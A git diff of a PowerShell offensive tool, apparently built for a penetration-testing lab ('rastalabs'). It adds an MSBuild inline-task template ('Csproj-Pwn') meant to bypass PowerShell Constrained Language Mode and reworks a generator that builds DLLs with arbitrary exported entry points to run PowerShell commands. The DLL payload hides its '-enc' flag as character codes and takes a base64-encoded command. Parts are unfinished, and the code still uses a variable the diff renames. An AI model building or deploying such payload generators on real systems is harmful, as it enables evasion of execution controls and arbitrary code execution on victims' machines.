@@ -1,3 +1,100 @@
+#TODO
+# fix new dll template to work with rundll
+
+# Convert all commands to base64 commands for the new template
+
+
+
+
+
+function Csproj-Pwn
+{
+<#
+.SYNOPSIS
+	
+.DESCRIPTION
+	
+	
+.PARAMETER DllName
+	
+
+.PARAMETER Entry
+	
+
+.PARAMETER Command
+	
+
+.PARAMETER Build
+	
+
+.EXAMPLE
+	
+	
+#>
+
+param
+(
+    [Parameter()]
+    [string]$DllName,
+	
+    [Parameter(Mandatory)]
+    [string]$Entry,
+	
+	[Parameter(Mandatory)]
+    [String]$Command,
+
+    [Parameter()]
+    [switch]$Build
+				
+)
+
+
+begin
+{
+$global:csproj = @"
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Oops">
+   <ByClm/>
+  </Target>
+   <UsingTask
+    TaskName="ByClm"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+     <Task>
+      <Reference Include="System.Management.Automation" />		
+      <Code Type="Class" Language="cs">
+      <![CDATA[
+		using System;
+        using System.Collections.Generic;
+        using System.Linq;
+        using System.Text;
+        using System.Management.Automation;
+        
+        namespace Oops
+        {
+	        class Oops
+	        {
+		        static void Main(string[] args)
+		        {
+			        //C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:System.Management.Automation.dll /platform:x64 /t:exe /unsafe /out:\rastalabs\payloads\oops.exe C:\rastalabs\payloads\oops.cs
+			        PowerShell ps = PowerShell.Create().AddCommand("cmd.exe").AddParameter("/c", "start").AddParameter("cmd.exe","");
+			        ps.Invoke();
+		        }
+	        }
+        }
+      ]]>
+
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+"@
+
+}
+}
+
+
+
 function Create-AppIl
 {
 <#
@@ -5,10 +102,10 @@ function Create-AppIl
 	Generates a dll with an arbitary Entrypoint and powershell commands. 
 	Author: p4yl0ad (p4yl0ad@protonmail.com)  
 	License: BSD 3-Clause  
-	Required Dependencies: csc.exe, ilasm.exe, ildasm.exe , powershell 3 installed
+	Required Dependencies: System[.]Management[.]Automation[.]dll in current working directory
 
 .DESCRIPTION
-	Utilizes System.Management.Automation.Runspaces in order to create a powershell runspace
+	Utilizes System[.]Management[.]Automation[.]Runspaces in order to create a powershell runspace
 	
 .PARAMETER DllName
 	Specifies the Name for the dll, if ommited iso standard date will be used for the binary
@@ -30,13 +127,18 @@ param
 (
     [Parameter()]
     [string]$DllName,
+	
     [Parameter(Mandatory)]
     [string]$Entry,
-    [Parameter(Mandatory)]
+	
+	[Parameter(Mandatory)]
     [String]$Command,
+
     [Parameter()]
-    [switch]$Build	
+    [switch]$Build
+				
 )
+
 
 begin
 {
@@ -44,37 +146,62 @@ begin
     $global:Entry = $Entry
     $global:Command = $Command.Replace("\","\\")
     $global:Build = $Build
-    $global:src = @"
-using System;
-using System.Configuration.Install;
-using System.Runtime.InteropServices;
-using System.Management.Automation.Runspaces;
 
-public class Program
-{
-	public static void Main()
-	{
-	}
-	public class Code
-	{
-		public static void Exec()
-		{	
-			string command = "{PEPEGA}";
-			RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
-			Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
-			rspace.Open();
-			Pipeline pipeline = rspace.CreatePipeline();
-			pipeline.Commands.AddScript(command);
-			pipeline.Invoke();
-		}
-	}
-}
+
+
+    $global:dllsrc = @"
+        using System;
+        using System.Collections.Generic;
+        using System.Linq;
+        using System.Text;
+        using System.Management.Automation;
+        
+        
+        namespace Oopsnamespace
+        {
+    	    public class Oopsclass
+    	    {
+    		    public static void Main()
+		        {
+		        }
+		        public class Code
+		        {
+        			public static void Exec()
+			        {
+        				PowerShell ps = PowerShell.Create().AddCommand("powershell.exe").AddParameter("([char]45+[char]101+[char]99)", "{BASE64COMMAND}");
+				        ps.Invoke();
+			        }
+		        }
+	        }
+        }
+"@
+
+    $global:exesrc = @"
+        using System;
+        using System.Collections.Generic;
+        using System.Linq;
+        using System.Text;
+        using System.Management.Automation;
+        
+        namespace Oops
+        {
+	        class Oops
+	        {
+		        static void Main(string[] args)
+		        {
+			        //C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference:System.Management.Automation.dll /platform:x64 /t:exe /unsafe /out:\rastalabs\payloads\oops.exe C:\rastalabs\payloads\oops.cs
+			        PowerShell ps = PowerShell.Create().AddCommand ("cmd.exe").AddParameter("/c", "start").AddParameter("cmd.exe","");
+			        ps.Invoke();
+		        }
+	        }
+        }
 "@
     $global:cscpath = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
     $global:ilasm = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe"
     $global:ildasm = "C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\x64\ildasm.exe"
     $global:smadll = "C:\Program Files (x86)\Reference Assemblies\Microsoft\WindowsPowerShell\3.0\System.Management.Automation.dll"
 }
+
 
 Process{
     if (Test-Path $cscpath)
@@ -104,10 +231,10 @@ function Invoke-FileCreate {
     Write-Host $global:DllName
     Write-Host $global:Entry
     Write-Host $global:Command
-    $global:fin = $src.Replace("{PEPEGA}",$Command)
+	$global:fin = $src.Replace("{PEPEGA}",$Command)
     Write-Host $global:fin
     $global:fin2 = $global:fin.Replace("Exec",$Entry)
-    Write-Host $global:fin2
+	Write-Host $global:fin2
     $global:srcfile = $global:DllName + ".cs"
     $global:fin2 | Out-File $global:srcfile
     Invoke-DllMove
@@ -120,7 +247,7 @@ function Invoke-DllMove{
 
 function Invoke-Compile{
      & $global:cscpath /platform:anycpu /reference:System.Management.Automation.dll /target:library /unsafe $global:srcfile #evildll.cs
-     del $global:srcfile 
+     #del $global:srcfile 
      Invoke-ToIl
 }
 
@@ -131,8 +258,8 @@ function Invoke-ToIl{
     $global:todel = "patched_" + $global:DllName + ".res"
     $global:DllNamedll = $global:srcfile = $global:DllName + ".dll" #evildll.dll
     & $global:ildasm /out:$global:patchilname $global:DllNamedll
-    del $global:todel
-    del $global:DllNamedll
+    #del $global:todel
+    #del $global:DllNamedll
     
     if ($Build)
     {
@@ -142,11 +269,12 @@ function Invoke-ToIl{
     }
     else{
         Invoke-EditExport
-        Write-Host "#Convert to base64 using https://github.com/FortyNorthSecurity/CLM-Base64 "
+        Write-Host "Convert to base64 using https://github.com/FortyNorthSecurity/CLM-Base64 "
         Write-Host "ipmo .\CLM-Base64.ps1; ConvertTo-Base64 -FilePath C:\pwd\evil.il | clip"
-	Write-Host "& C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ilasm.exe evil.il /DLL /output=evil-patched.dll"
     }
+
 }
+
 
 function Invoke-EditExport{
     (gc $global:patchilname) -replace ".maxstack  2", ".export [1]`n`t$&" | sc $global:patchilname
